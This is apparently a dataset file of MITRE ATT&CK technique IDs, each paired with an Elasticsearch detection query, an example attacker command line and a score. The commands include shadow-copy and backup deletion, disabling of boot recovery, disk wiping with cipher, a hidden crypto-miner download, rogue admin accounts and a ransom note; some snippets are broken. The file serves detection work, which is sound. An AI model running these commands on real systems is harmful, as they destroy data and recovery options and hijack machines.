@@ -1,0 +1,330 @@
+﻿T1531,"{
+    ""query"": {
+        ""bool"": {
+            ""should"": [
+                            {""match_phrase"":{""CommandLine"": ""net user""}},
+                            {""match_phrase"":{""CommandLine"": ""net.exe user""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","net user AtomicAdministrator User2ChangePW! /add 
+&& net.exe user AtomicAdministrator HuHuHUHoHo283283@dJD",2
+T1496," {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""Invoke-WebRequest""}},
+                {""match_phrase"": {""CommandLine"": ""Expand-Archive""}},
+                {""match_phrase"": {""CommandLine"": ""Start-Process""}}            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-msvc-win64.zip -OutFile xmrig-6.11.2-msvc-win64.zip;
+Expand-Archive -LiteralPath xmrig-6.11.2-msvc-win64.zip -DestinationPath .\;
+Start-Process "".\xmrig-6.11.2\xmrig.exe"" -WindowStyle Hidden;
+Start-Sleep -Seconds 60;
+Stop-Process -Name ""xmrig""",2
+T1531," {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""net user""}},
+                {""match"": {""CommandLine"": ""add""}},
+                 {""match"": {""CommandLine"": ""delete""}}, 
+                 {""match_phrase"": {""CommandLine"": ""net.exe user""}},
+                
+          ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}",net user AtomicUser User2DeletePW! /add && net.exe user AtomicUser /delete,2
+T1490," {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""reg add""}},
+                {""match"": {""CommandLine"": ""SystemRestore""}}, 
+                {""wildcard"": {""CommandLine"": ""disable*""}}            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore"" /v ""DisableConfig"" /t ""REG_DWORD"" /d ""1"" /f 
+&& reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore"" /v ""DisableSR"" /t ""REG_DWORD"" /d ""1"" /f 
+&& reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"" /v ""DisableConfig"" /t ""REG_DWORD"" /d ""1"" /f 
+&& reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"" /v ""DisableSR"" /t ""REG_DWORD"" /d ""1"" /f",2
+T1565.001,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            {""wildcard"":{""CommandLine"": ""copy*""}}, 
+                             {""match"":{""CommandLine"": ""-duration""}},
+                              {""match"":{""CommandLine"": ""-extension""}},   
+                             {""match"":{""CommandLine"": ""-dir""}},                  
+                            {""wildcard"":{""CommandLine"": ""*exe""}},
+                             {""wildcard"":{""CommandLine"": ""*go""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",copy mission.go mission.exe &&mission.exe -duration 60 -extension .caldera -dir C:\,2
+T1565.001,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            {""match"":{""CommandLine"": ""mv""}}, 
+                             {""match"":{""CommandLine"": ""-duration""}},
+                              {""match"":{""CommandLine"": ""-extension""}},   
+                             {""match"":{""CommandLine"": ""-dir""}},                  
+                            {""wildcard"":{""CommandLine"": ""*.exe""}},
+                             {""wildcard"":{""CommandLine"": ""*.go""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",mv mission.go mission.exe;.\mission.exe -duration 60 -extension .caldera -dir 'C:\';,2
+T1491,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            {""match_phrase"":{""CommandLine"": ""Invoke-MemeKatz.ps1""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",".\Invoke-MemeKatz.ps1
+powershell.exe -ep bypass -c ""Invoke-MemeKatz.ps1""",1
+T1491,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            {""match_phrase"":{""CommandLine"": ""Set-Content""}},
+                            {""match_phrase"":{""CommandLine"": ""-Value""}},
+                             {""match_phrase"":{""CommandLine"": ""-Path'""}}            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",Set-Content -Path 'message.txt' -Value 'proof that this machine was hacked.',2
+T1485,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            {""match_phrase"":{""CommandLine"": ""cipher.exe""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",cipher.exe /w:C:,2
+T1486,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match"": {""CommandLine"": ""echo""}},
+                {""match"": {""CommandLine"": ""Purelocker""}},
+                {""match"": {""CommandLine"": ""&gt;""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}",echo T1486 - Purelocker Ransom Note > %USERPROFILE%\Desktop\YOUR_FILES.txt,2
+T1531,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            {""match_phrase"":{""CommandLine"": ""Get-ADUser""}},
+                            {""match_phrase"":{""CommandLine"": ""System.Management.Automation.PSCredential""}},
+                            {""match_phrase"":{""CommandLine"": ""Remove-ADGroupMember""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","$PWord = ConvertTo-SecureString -String; 
+$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList; 
+if((Get-ADUser;   Remove-ADGroupMember -Identity ""Domain Admins"" -Members; } 
+else{;     write-host ""Error - Make sure #{remove_user} is in the domain admins group"" -foregroundcolor Red; }",
+T1491.001,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            {""match_phrase"":{""CommandLine"": ""Control Panel\\Desktop\\""}},
+                               {""wildcard"":{""CommandLine"": ""*Net.WebClient""}},
+                              {""wildcard"":{""CommandLine"": ""*Wallpaper""}},
+                            {""wildcard"":{""CommandLine"": ""*Dispose""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","$url = ""#{url_of_wallpaper}""; $imgLocation = ""#{wallpaper_location}"";
+$orgWallpaper = (Get-ItemProperty -Path Registry::'HKEY_CURRENT_USER\Control Panel\Desktop\' -Name WallPaper).WallPaper; 
+$orgWallpaper | Out-File -FilePath ""#{pointer_to_orginal_wallpaper}""; 
+$updateWallpapercode = @' ; using System.Runtime.InteropServices; 
+namespace Win32{;     public class Wallpaper{ ;         [DllImport(""user32.dll"", CharSet=CharSet.Auto)] ;          static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;          ;          
+public static void SetWallpaper(string thePath){ ;             SystemParametersInfo(20,0,thePath,3);         };     }; } ; '@;
+ $wc = New-Object System.Net.WebClient  ; 
+try{  ;     $wc.DownloadFile($url, $imgLocation);     
+add-type $updateWallpapercode ;     
+[Win32.Wallpaper]::SetWallpaper($imgLocation); } ; 
+catch [System.Net.WebException]{  ;     Write-Host(""Cannot download $url"") ;     
+add-type $updateWallpapercode ;     [Win32.Wallpaper]::SetWallpaper($imgLocation); } ; 
+finally{    ;     $wc.Dispose()  ; }",0
+T1529,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            {""match_phrase"":{""CommandLine"": ""shutdown /r /t 1""}}            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",shutdown /r /t 1,2
+T1490,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must"":[{""match_phrase"":{""CommandLine"": ""del""}}                ]
+     }
+    },
+    {""bool"":{
+     ""should"":[
+                       {""match_phrase"":{""CommandLine"": ""*.VHD""}},
+                       {""match_phrase"":{""CommandLine"": ""*.bac""}},
+                       {""match_phrase"":{""CommandLine"": ""*.bak""}},
+                       {""match_phrase"":{""CommandLine"": ""*.wbcat""}},
+                       {""match_phrase"":{""CommandLine"": ""*.bkf""}},
+                       {""match_phrase"":{""CommandLine"": ""Backup*.*""}},
+                       {""match_phrase"":{""CommandLine"": ""backup*.*""}},
+                       {""match_phrase"":{""CommandLine"": ""*.set""}},
+                       {""match_phrase"":{""CommandLine"": ""*.win""}},
+                       {""match_phrase"":{""CommandLine"": ""*.dsk""}}
+                        
+                                                   ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk,2
+T1490,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            {""match_phrase"":{""CommandLine"": ""delete ""}},
+                             {""match_phrase"":{""CommandLine"": ""vssadmin.exe""}}
+         ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",vssadmin.exe delete shadows /all /quiet,2
+T1490,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            {""wildcard"":{""CommandLine"": ""wmic*""}},
+                            {""match_phrase"":{""CommandLine"": ""delete""}}
+         ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",wmic.exe shadowcopy delete,2
+T1490,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            {""wildcard"":{""CommandLine"": ""schtasks*""}},
+                            {""match"":{""CommandLine"": ""/Change""}},
+                             {""match"":{""CommandLine"": ""/disable""}},
+                            {""match_phrase"":{""CommandLine"": ""SystemRestore\\SR""}}
+         ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","schtasks.exe /Change /TN ""\Microsoft\Windows\SystemRestore\SR"" /disable",2
+T1490,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            {""wildcard"":{""CommandLine"": ""bcdedit*""}},
+                            {""match"":{""CommandLine"": ""bootstatuspolicy""}},
+                              {""match"":{""CommandLine"": ""/set""}},
+                             {""match"":{""CommandLine"": ""recoveryenabled""}}
+         ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures 
+&& bcdedit.exe /set {default} recoveryenabled no",2
+T1485,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                             {""match_phrase"":{""CommandLine"": ""Invoke-Expression""}},
+                              {""match_phrase"":{""CommandLine"": ""\\Sdelete\\""}},
+                               {""match"":{""CommandLine"": ""-accepteula""}}
+         ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","if (-not (Test-Path $env:TEMP\T1485.txt)) { New-Item $env:TEMP\T1485.txt -Force };
+Invoke-Expression -Command ""$env:TEMP\Sdelete\sdelete.exe -accepteula $env:TEMP\T1485.txt""",
+T1489,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            {""wildcard"":{""CommandLine"": ""taskkill*""}},
+                            {""match"":{""CommandLine"": ""/im""}},
+                             {""match"":{""CommandLine"": ""/f""}}
+         ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",taskkill.exe /f /im spoolsv.exe,2
+T1489,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            {""match_phrase"":{""CommandLine"": ""stop spooler""}}
+         ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","sc.exe stop spooler
+
+net.exe stop spooler",2
+T1490,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            {""match"":{""CommandLine"": ""wbadmin""}},
+                            {""match_phrase"":{""CommandLine"": ""delete catalog""}},
+                             {""match_phrase"":{""CommandLine"": ""-quiet""}},
+                             
+
+         ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",wbadmin delete catalog -quiet,2
+T1490,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [ 
+                            {""match"":{""CommandLine"": ""wbadmin""}},
+                            {""match_phrase"":{""CommandLine"": "" delete systemstatebackup""}}
+         ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",wbadmin delete systemstatebackup -keepVersions:0,2
+T1490,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            {""wildcard"":{""CommandLine"": ""*Delete""}},
+                            {""match_phrase"":{""CommandLine"": ""Win32_Shadowcopy""}},
+                             {""match_phrase"":{""CommandLine"": ""Get-WmiObject""}}
+         ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();},2
